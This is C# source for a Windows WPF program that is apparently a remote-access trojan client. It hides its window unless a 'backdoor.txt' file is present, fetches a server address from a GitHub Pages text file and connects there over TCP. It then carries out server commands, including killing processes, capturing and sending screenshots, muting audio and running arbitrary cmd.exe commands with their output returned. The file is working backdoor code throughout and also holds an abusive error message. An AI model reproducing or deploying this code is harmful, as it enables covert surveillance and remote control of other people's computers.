using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Net.Sockets;
using System.Threading;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using Newtonsoft.Json;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing;
using System.Windows.Interop;
using System.Drawing.Imaging;
using Point = System.Drawing.Point;


namespace WpfApp1
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        private string ip_;
        private TcpClient _client;              // 客户端对象
        private NetworkStream _stream;          // 网络流，用于收发数据
        private Thread _receiveThread;          // 后台接收线程
        private string[] cmdType_str = {"normal","test","getTasksList","MsgBox", "KillbyPID" ,"cmd", "mute", "capture"}; //命令类型
        string computerName = Environment.MachineName;
        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;//模拟静音键
        private const int WM_APPCOMMAND = 0x0319;

        public ObservableCollection<ProcessItem> Procs { get; set; } = new ObservableCollection<ProcessItem>();
        public MainWindow()
        {
            InitializeComponent();
            this.DataContext = this; // 绑定数据上下文
            if (!File.Exists("backdoor.txt"))
            {
                this.Hide();
            }
            string url = "http://reiz2005.github.io/server.txt";
            if (File.Exists("local.txt"))
            {
                ConnectToServer("127.0.0.1", 5000); // 连接服务器
            }
            else
            {
                using (HttpClient client = new HttpClient())
                {
                    try
                    {
                        string textContent = client.GetStringAsync(url).GetAwaiter().GetResult();
                        ip_ = textContent;
                        ip_TB.Text = ip_;
                        String IPandPort = ip_TB.Text;
                        String[] array = IPandPort.Split(':');
                        int pt = int.Parse(array[1]);
                        ConnectToServer(array[0], pt); // 连接服务器

                    }
                    catch (HttpRequestException ex)
                    {
                        System.Windows.MessageBox.Show("傻逼去死吧\n" + ex.Message, "wcsndm", MessageBoxButton.OK, MessageBoxImage.Error);

                    }
                }
            }
            

        }

        private void ConnectToServer(string ip, int port)
        {
            try
            {
                _client = new TcpClient(ip,port);
                _stream = _client.GetStream();
                AppendMessage("Connected to server.");

                // 开启接收线程
                _receiveThread = new Thread(ReceiveLoop);
                _receiveThread.IsBackground = true;
                _receiveThread.Start();

                sendPackage(1, "Hello "+ computerName);
            }
            catch (Exception ex)
            {
                AppendMessage("Connection error: " + ex.Message);
            }
        }

        private void ReceiveLoop()
        {
            try
            {
                // 不断接收服务器消息
                while (true)
                {
                    byte[] headerBuffer = new byte[8];
                    if(!isReadFully(_stream,headerBuffer,8)) break;
                    //头部信息
                    int bodyLen = BitConverter.ToInt32(headerBuffer, 0);
                    int cmdType = BitConverter.ToInt32(headerBuffer, 4);

                    //信息体
                    byte[] body = new byte[bodyLen];
                    int totalRead = 0;
                    while (totalRead < bodyLen) 
                    {
                        int bytesRead = _stream.Read(body, totalRead, bodyLen - totalRead);
                        if (bytesRead == 0) break; // 断开
                        totalRead += bytesRead;
                    }
                    string bodyStr = Encoding.UTF8.GetString(body,0,totalRead);

                    switch (cmdType)
                    {
                        case 0:
                            Dispatcher.Invoke(() => AppendMessage($"[Server][{cmdType_str[cmdType]}] {bodyStr}"));
                            break;
                        case 1:
                            Dispatcher.Invoke(() =>
                            {
                                AppendMessage($"[Server][{cmdType_str[cmdType]}] {bodyStr}");
                                if (bodyStr == "1")
                                {
                                    AppendMessage("[Client] 服务器可用性验证通过");
                                }
                            });
                            
                            break;
                        case 2:
                            Dispatcher.Invoke(() => { 
                                AppendMessage($"[Server][{cmdType_str[cmdType]}] {bodyStr}");
                                AppendMessage($"[Client][{cmdType_str[cmdType]}] 已发送任务列表");
                            
                            });
                            //给服务器发送procs转换成列表json
                            //刷新保持列表最新 
                            Dispatcher.Invoke(() =>
                            {
                                RefreshList();
                            });
                            var processList = Procs.ToList();
                            string json = JsonConvert.SerializeObject(processList);
                            int ct = 2;
                            sendPackage(ct,json);
                            break;
                        case 3:
                            Dispatcher.Invoke(() =>
                            {
                                AppendMessage($"[Server][{cmdType_str[cmdType]}] {bodyStr}");
                            });
                            Thread thrMsg = new Thread(new ParameterizedThreadStart(msgbox));
                            thrMsg.IsBackground = true; 
                            thrMsg.Start(bodyStr);
                            break;
                        case 4:
                            Dispatcher.Invoke(() =>
                            {
                                AppendMessage($"[Server][{cmdType_str[cmdType]}]{bodyStr}");

                            });
                            int pid = int.Parse(bodyStr);
                            try
                            {
                                Dispatcher.Invoke(() =>
                                {
                                    Process.GetProcessById(pid).Kill();
                                    RefreshList();
                                });
                            }
                            catch (Exception ex)
                            {
                                Dispatcher.Invoke(() =>
                                {
                                    AppendMessage($"[Client]结束失败: {ex.Message}");
                                    sendPackage(0, $"[Client]结束失败: {ex.Message}");
                                });
                            }

                            break;
                        case 5:
                            Dispatcher.Invoke(() =>
                            {
                                AppendMessage($"[Server][{cmdType_str[cmdType]}]{bodyStr}");
                            });
                            if (!string.IsNullOrEmpty(bodyStr))
                            {
                                Thread cmdThr = new Thread(new ParameterizedThreadStart(ExcuteCmdAndReturn));
                                cmdThr.IsBackground = true;
                                cmdThr.Start(bodyStr);
                            }
                            break;
                        case 6:
                            Dispatcher.Invoke(() =>
                            {
                                AppendMessage($"[Server][{cmdType_str[cmdType]}]{bodyStr}");
                            });
                            ToggleMute();
                            break;
                        case 7:
                            Dispatcher.Invoke(() =>
                            {
                                AppendMessage($"[Server][{cmdType_str[cmdType]}]{bodyStr}");
                            });
                            byte[] captureBytes = CaptureScreen();
                            byte[] captureLen = BitConverter.GetBytes(captureBytes.Length);
                            byte[] cmdT = BitConverter.GetBytes(7);
                            _stream.Write(captureLen,0,captureLen.Length);
                            _stream.Write(cmdT,0,cmdT.Length);
                            _stream.Write(captureBytes,0,captureBytes.Length);


                            break;
                    }
                    string time_ = DateTime.Now.ToString("yyyy/MM/dd - HH:mm:ss");
                    Dispatcher.Invoke(() => AppendMessage($"{time_}"));
                }
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => AppendMessage("Receive error: " + ex.Message));
            }
            finally
            {
                _client.Close();

                
                Dispatcher.Invoke(() => 
                {
                    AppendMessage("Disconnected from server.");

                    btnSend.IsEnabled = !btnSend.IsEnabled;
                    
                });
            }
        }

        private void msgbox(object obj)
        {
            System.Windows.MessageBox.Show((string)obj, "system", MessageBoxButton.OK, MessageBoxImage.Information);
        }

        private void BtnSend_Click(object sender, RoutedEventArgs e)
        {
            string text = TxtInput.Text;//需要发送的文本
            if (string.IsNullOrEmpty(text) || _stream == null) return;
            int ct = 0; //发送命令类型
            sendPackage(ct,text);
            AppendMessage("[Client]You: " + text);
            TxtInput.Clear();
        }

        // 在 UI 中追加消息
        private void AppendMessage(string message)
        {
            TxtMessages.AppendText(message + "\n");
            TxtMessages.ScrollToEnd();
        }

        private void RefreshList()
        {
            Procs.Clear();

            var list = new List<ProcessItem>();
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    list.Add(new ProcessItem
                    {
                        Name = process.ProcessName,
                        PID = process.Id,
                        Module = process.MainModule.ModuleName
                    });
                }
                catch { /* 忽略访问失败的进程 */ }
            }

            foreach (var item in list.OrderBy(p => p.Name))
            {
                Procs.Add(item);
            }
        }

        private void MenuItemKill_Click(object sender, RoutedEventArgs e)
        {
            if (listView.SelectedItem is ProcessItem selected)
            {
                var result = System.Windows.MessageBox.Show($"确定要结束进程 {selected.Name} (PID: {selected.PID})？",
                                             "确认", MessageBoxButton.YesNo, MessageBoxImage.Warning);
                if (result == MessageBoxResult.Yes)
                {
                    try
                    {
                        Process.GetProcessById(selected.PID).Kill();
                        RefreshList();
                    }
                    catch (Exception ex)
                    {
                        System.Windows.MessageBox.Show($"结束失败: {ex.Message}");
                    }
                }
            }
        }

        private void MenuItemRefresh_Click(object sender, RoutedEventArgs e)
        {
            RefreshList();
        }
        public class ProcessItem
        {
            public string Name { get; set; }
            public int PID { get; set; }
            public string Module { get; set; }
        }

        private void listView_MouseRightButtonUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (listView.SelectedItem == null && listView.Items.Count > 0)
            {
                listView.SelectedIndex = 0;
            }
        }

        private void BtnCmdType_Click(object sender, RoutedEventArgs e)
        {
            string text = TxtInput.Text;//需要发送的文本
            if (string.IsNullOrEmpty(text) || _stream == null) return;
            int ct = 1; //发送命令类型 request
            sendPackage(ct,text);
            AppendMessage($"[Client][{cmdType_str[ct]}]You: {text}");
            TxtInput.Clear();
        }

        //封装并发送数据包
        private void sendPackage(int cmdType_, string bodyStr)
        {
            byte[] dataBytes = Encoding.UTF8.GetBytes(bodyStr); //消息体字符串转换字节集
            byte[] lenBytes = BitConverter.GetBytes(dataBytes.Length); //消息体长度int转换字节集
            byte[] cmdBytes = BitConverter.GetBytes(cmdType_);//int命令类型转换字节集

            _stream.Write(lenBytes, 0, 4);
            _stream.Write(cmdBytes, 0, 4);
            _stream.Write(dataBytes, 0, dataBytes.Length);
        }
        bool isReadFully(NetworkStream stream, byte[] buffer, int size)//判断是否读取到了指定字节数
        {
            int offset = 0;
            while (size > 0)
            {
                int read = stream.Read(buffer, offset, size);
                if (read <= 0) return false; // 连接断了
                offset += read;
                size -= read;
            }
            return true;
        }

        private void ExcuteCmdAndReturn(object cmd)//执行命令并返回结果
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {cmd}";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;

                // 设置输出数据接收事件
                process.OutputDataReceived += (s, args) =>
                {
                    if (!string.IsNullOrEmpty(args.Data))
                    {
                        int ct = 5;
                        sendPackage(ct, "INFO: " + args.Data);
                    }
                };

                // 设置错误数据接收事件
                process.ErrorDataReceived += (s, args) =>
                {
                    if (!string.IsNullOrEmpty(args.Data))
                    {
                        int ct = 5;
                        sendPackage(ct, $"ERROR: {args.Data}");
                    }
                };
                process.Start();

                // 开始异步读取输出
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                process.WaitForExit();
                process.Close();
            }
            catch (Exception ex)
            {
                //strings_.Append($"Exception: {ex.Message}");
                int ct = 5;
                sendPackage(ct, $"Exception: {ex.Message}");
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
        public void ToggleMute()
        {
            SendMessageW(
                hWnd: (IntPtr)0xFFFF, // 广播消息到所有顶层窗口
                Msg: WM_APPCOMMAND,
                wParam: IntPtr.Zero,
                lParam: (IntPtr)APPCOMMAND_VOLUME_MUTE
            );
        }

        public static byte[] CaptureScreen()
        {
            var bounds = Screen.PrimaryScreen.Bounds;

            using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
            using (var graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

                // 配置JPEG编码器
                var jpegEncoder = ImageCodecInfo.GetImageEncoders()
                    .First(e => e.FormatID == ImageFormat.Jpeg.Guid);

                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 85L);

                using (var ms = new MemoryStream())
                {
                    bitmap.Save(ms, jpegEncoder, encoderParams);
                    return ms.ToArray();
                }
            }
        }


    }
}
